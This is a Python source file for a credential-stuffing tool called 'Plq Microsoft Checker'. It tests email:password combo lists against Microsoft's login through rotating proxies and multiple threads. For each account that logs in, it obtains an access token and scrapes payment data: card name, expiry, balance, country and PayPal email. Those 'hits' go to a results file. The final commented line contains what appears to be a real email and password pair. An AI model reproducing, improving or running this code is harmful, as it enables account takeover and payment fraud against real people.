import requests, os, re, threading, readchar, random, time, sys
from time import gmtime, strftime
from colorama import Fore
from console import utils
from tkinter import filedialog
from urllib.parse import unquote



logo = Fore.GREEN+'''
  ____  _         __  __ _                           __ _      ____ _               _             
 |  _ \| | __ _  |  \/  (_) ___ _ __ ___  ___  ___  / _| |_   / ___| |__   ___  ___| | _____ _ __ 
 | |_) | |/ _` | | |\/| | |/ __| '__/ _ \/ __|/ _ \| |_| __| | |   | '_ \ / _ \/ __| |/ / _ \ '__|
 |  __/| | (_| | | |  | | | (__| | | (_) \__ \ (_) |  _| |_  | |___| | | |  __/ (__|   <  __/ |   
 |_|   |_|\__, | |_|  |_|_|\___|_|  \___/|___/\___/|_|  \__|  \____|_| |_|\___|\___|_|\_\___|_|   
             |_|                                                                                  \n'''

loginUrl = "https://login.live.com/ppsecure/post.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1&contextid=C61E086B741A7BC9&bk=1573475927&uaid=e94a49f177664960a3fca122edaf8a27&pid=0" 

combo = []
proxylist = []
emails = []
passwords = []
hitlist = []
hits = 0
bad = 0
twofa = 0
cpm = 0
cpm1 = 0
retries = 0
checked = 0

day = strftime("%Y-%m-%d-%H-%M-%S", gmtime())


def loginPost(email, password, proxy): #proxy 

    global hits, bad, twofa, cpm, checked

    session = requests.Session()
    session.proxies = proxy

    payloadLogin = f"i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=DZshWk88CvvuA9vSOHldJLurwIJH4a7uUREfu4fGCsbB2nL*YUw36i0Lz7tZDGptQxZhUTW0%21*ZM3oIUxGKEeEa1gcx%21XzBNiXpzf*U9iH68RaP3u20G0J6k2%21UdeMFc9C9uusE3IwI3gi4u7wJzyq8FCiNuk2Hly66dMuX96mSwHTYXgtZZpS%21rbS35jrsdC%21Ku4UysydsP0MXSz2klYp9KU%21hDHeKBZIu13h%21rQk9jG2vzCW4OerTedipQDJRuAg%24%24&PPSX=Passpor&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i2=1&i17=0&i18=&i19=32099"


    headerLogin = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Upgrade-Insecure-Requests": "1",
        "Referer": "https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&rver=7.1.6819.0&wp=MBI_SSL&wreply=https:%2f%2faccount.xbox.com%2fen-us%2faccountcreation%3freturnUrl%3dhttps:%252f%252fwww.xbox.com:443%252fen-US%252f%26ru%3dhttps:%252f%252fwww.xbox.com%252fen-US%252f%26rtc%3d1&lc=1033&id=292543&aadredir=1",
        "Cookie": "wlidperf=FR=L&ST=1573475967016; MSPShared=1; SDIDC=CavoGthu*pkJAN8Eek6dWr5opN5x1BL2!mueAsRqcHLVS94TF9fJG7M1fnoFg6a*recSzMqgr*rslJH2ICxiqJGNoOHcIMFXc!RLunwBMWhU0x321UT4GCRmUx6DZ7AjzurT*F2lfakG55iffb2VLqMt0mhzOabJGnTjvNhmJC9g1p*grJ8oN9vhRFP1QX!nZ!fWcW27*aTbPPnlAGv9aKLWqL*MazqS52WCQ1qeFZq2cv5ZfnxVwVkgfgjdQvs2GEwfHcnTOQx1uQdtaK9OZwguM8Ck!XoiweJLLeKfFhKRZuntwAkM7ZR0uwP6Z19dR7mBTpGpy5F6!dyrkpKizd9!nzZSFFo*7poLWKhu1rNfXZj1IGgaH9sTsatt8!OJcUye6DGBEO2UgVGMYZSXh3qZLLQfoCt27U2AyIJI2kF!CwX2SD8t9RLWxmz1S3NIVWmBO8wm!DlUH1lpURHmiXbk1m!22SzIKy09LvlGae8GFkF!Rx57Ef2CKW5i5QTBtQ$$; IgnoreCAW=1; MSCC=1571654982; mkt=en-US; optimizelyEndUserId=oeu1572238927711r0.5850160263416339; uaid=e94a49f177664960a3fca122edaf8a27; MSPRequ=id=292543&lt=1573475927&co=1; OParams=11DUe2VlF3OgbQNYrRZRg3REn8KImGd*MjJ03B0XHPylHxLr2YAXrzYNH!J96HFWgoWGEdSPWFdPiET54l8VSW7HH0FPuC0Ce2pxC2uyWUloRhCunIwMUB8QUtvNr0as9T1RluKxlaF5K4LNi7CWjITDPFW2tzU!gS5LVvUdG58wfPg1itYuqY2HKQNrXN51!s!LMD8g2Gf5pcrXZibicJLoN1z5P3XSQm2UhakTdBNoDEruwv8MWbzT!5ImiwMzPP*G5APiiLE!9EKUwPT49z1!ERSbMlpzjFZP25j3o01h!9VuAllBJeaaJeclbcH9QuCwvUd2N3Z6kCiV5jlEKbyfAbHAiIJ6TNAmwU3ftHK08Fy5L6vUHSZRyocbR18FVCoP7lMVfmfQfS41VEmD3JdZTwjJIosaE7!i7E31jx5gwDqYZpo0wjnRzQlt3I9twovyRxbRxuvMVRqN7ey0AE7XI67w70kjUoRg*NbmI2BAxmuNnAdujjs4YlLsdZ8iIIFk73CkQpQ6X!MO58xB09KYImQyevehtDlrXkr*oDQCAh; MSPOK=$uuid-6b855d49-8f09-4e83-8526-b756788bf3b9$uuid-02a3151d-ba2d-4c6c-be88-c9c804ecb043" 
    }

    loginRequest = session.post(loginUrl, data=payloadLogin, headers=headerLogin, allow_redirects=True, timeout=10)

    #FAILURE CHECK
    response_content = loginRequest.content.decode('utf-8')
    if ",AC:null,urlFedConvertRename" in response_content or 'incorrect account or password.",' in response_content or ",AC:null,urlFedConvertRename" in response_content or "timed out" in response_content:
        bad += 1
        checked+=1
        cpm+=1
            
    #SUCCESS CHECK
    elif "PPAuth" in loginRequest.cookies or "WLSSC" in loginRequest.cookies or 'name="ANON"' in response_content or "sSigninName" in response_content:
        parse_token(session,session.cookies,email,password)
                
                

    #2FA CHECK
    elif "account.live.com/recover?mkt" or "recover?mkt" or "account.live.com/identity/confirm?mkt" or "',CW:true" or "https://account.live.com/profile/accrue?mkt=" or "Email/Confirm?mkt" or "/cancel?mkt=" or "/Abuse?mkt=" in response_content:
        twofa += 1
        checked+=1
        cpm+=1






    
    

def parse_token(session,cookies,email,password):
    global retries
    token_url = "https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none" 

    headers_token = {
        "Host": "login.live.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
        "Accept-Language": "en-US,en;q=0.5", 
        "Accept-Encoding": "gzip, deflate", 
        "Connection": "close", 
        "Referer": "https://account.microsoft.com/" 
    }
        
    token_get = session.get(token_url, headers=headers_token, cookies=cookies)
    if "access_token" in token_get.url:
        token = None
        match = re.search(r'token=([^&]*)', token_get.url)
        if match:
            token = match.group(1)
            token = unquote(token) #URLDECODE token
            capture(session, token,email,password)


def safe_extract(pattern, text):
    match = re.search(pattern, text)
    return match.group(1) if match else None

def capture(session, token,email,password):

    global hits, twofa, checked, hitlist, cpm

    headersCapture= {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36", 
        "Pragma": "no-cache", 
        "Accept": "application/json", 
        "Accept-Encoding": "gzip, deflate, br", 
        "Accept-Language": "en-US,en;q=0.9", 
        "Authorization": f'MSADELEGATE1.0="{token}"', 
        "Connection": "keep-alive", 
        "Content-Type": "application/json", 
        "Host": "paymentinstruments.mp.microsoft.com", 
        "ms-cV": "FbMB+cD6byLL1mn4W/NuGH.2", 
        "Origin": "https://account.microsoft.com", 
        "Referer": "https://account.microsoft.com/", 
        "Sec-Fetch-Dest": "empty", 
        "Sec-Fetch-Mode": "cors", 
        "Sec-Fetch-Site": "same-site", 
        "Sec-GPC": "1" 
    }

    capture_url = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=pt-BR"

    capture_get = session.get(capture_url, headers=headersCapture)

    balance_re = re.compile(r'balance":(.*?),')
    country_re = re.compile(r'"country":"(.*?)"')
    payment_method_re = re.compile(r'paymentMethodFamily":"credit_card","display":{"name":"(.*?)"')
    expiry_year_re = re.compile(r'"expiryYear":"(.*?)"')
    expiry_month_re = re.compile(r'"expiryMonth":"(.*?)"')
    paypal_re = re.compile(r',"email":"(.*?)","billingAgreementType"')


    balance = safe_extract(balance_re, capture_get.content.decode('utf-8'))
    country = safe_extract(country_re, capture_get.content.decode('utf-8'))
    payment_method = safe_extract(payment_method_re, capture_get.content.decode('utf-8'))
    expiry_year = safe_extract(expiry_year_re, capture_get.content.decode('utf-8'))
    expiry_month = safe_extract(expiry_month_re, capture_get.content.decode('utf-8'))
    paypal = safe_extract(paypal_re, capture_get.content.decode('utf-8'))

    cpm+=1

    hitprint = f"{email}:{password} | {balance}$ | {country} | {payment_method} | {expiry_month}/{expiry_year} | {paypal}"
    checked += 1
    hits += 1
    hitlist.append(hitprint)
    append_to_file(f"results/{day}/hits.txt", hitlist[-1])
    print(Fore.GREEN+hitprint)



def Load():
    global ComboName
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    ComboName = os.path.basename(filename.name)
    if filename is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        Load()
    else:
        try:
            with open(filename.name, 'r', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        Dump = line.replace('\n', '')
                        combo.append(Dump)
                    except: pass
            Dumped =  list(dict.fromkeys(combo))
            RemovedLines = len(combo) - len(Dumped)
            print(Fore.LIGHTBLUE_EX+f"[{RemovedLines}] Dupes Removed.")
            for lines in combo:
                try:
                    email = lines.split(":")[0].replace('\n', '')
                    password = lines.split(":")[1].replace('\n', '')
                    if email == "" or password == "": pass
                    emails.append(email)
                    passwords.append(password)
                except: pass
            print(Fore.LIGHTBLUE_EX+f"[{len(emails)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            Load()


def Proxys():
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print()
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Proxys()

def cuiscreen():
    global hits, bad, twofa, cpm, cpm1, retries, checked
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}\{len(combo)}] Checked")
    print(f" [{hits}] Good")
    print(f" [{bad}] Bad")
    print(f" [{twofa}] 2FA")
    print(f" [{retries}] Retries")
    time.sleep(2)
    utils.set_title(f"Plq Microsoft Checker | Checked: {checked}\{len(combo)}  -  Good: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  Cpm: {cmp1*60}  -  Retries: {retries}")
    threading.Thread(target=cuiscreen, args=()).start()

def finishedscreen():
    os.system('cls')
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+hits)
    print("Bad: "+bad)
    print("2FA: "+twofa)
    print()
    print(Fore.LIGHTRED_EX+"Press any key to exit.")
    repr(readchar.readkey())
    sys.exit()

def Checker(email, password, proxylist):
    try:
        global hits,bad,twofa,cpm,cpm1,retries,checked
        sess = requests.Session()
        sess.verify = False
        if proxytype != "'4'": proxy = random.choice(proxylist)
        if proxytype  == "'1'": proxy_for_check = {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": proxy_for_check = {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'": proxy_for_check = {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
        elif proxytype  == "'4'": proxy_for_check = None
        else: proxy_for_check = {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        loginPost(str(email), str(password), proxy_for_check)
    except Exception as e:
        retries+=1
        threading.Thread(target=Checker, args=(email, password, proxylist)).start()

def append_to_file(path, item):
    with open(path, 'a') as file:
        file.write(f"{item}\n")

def Main():
    global proxytype

    print(logo)
    utils.set_title("Plq Microsoft Checker")

    print(Fore.LIGHTBLUE_EX+"Select your combos")
    Load()

    try:
        thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))

    except:
        print(Fore.LIGHTRED_EX+"Must be a number.") 
        time.sleep(2)
        Main()

    print(Fore.LIGHTBLUE_EX+"Proxy Type: [1] Http\s - [2] Socks4 - [3] Socks5 - [4] None") 
    proxytype = repr(readchar.readkey())

    if proxytype != "'4'":
        print(Fore.LIGHTBLUE_EX+"Select your proxies")
        Proxys()

    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+day): os.makedirs('results/'+day)
    with open(f'results/{day}/hits.txt', 'w') as file:
        file.write("HITS")
    cuiscreen()


    num = 0
    while 1:
        if threading.active_count() < int(thread):
            if len(combo) > num:
                num+=1
                threading.Thread(target=Checker, args=(emails[num], passwords[num], proxylist)).start()
            
            if checked >= len(combo):
                finishedscreen()

Main()
#loginPost("gabipbaggio@outlook.com","Cadeira123")
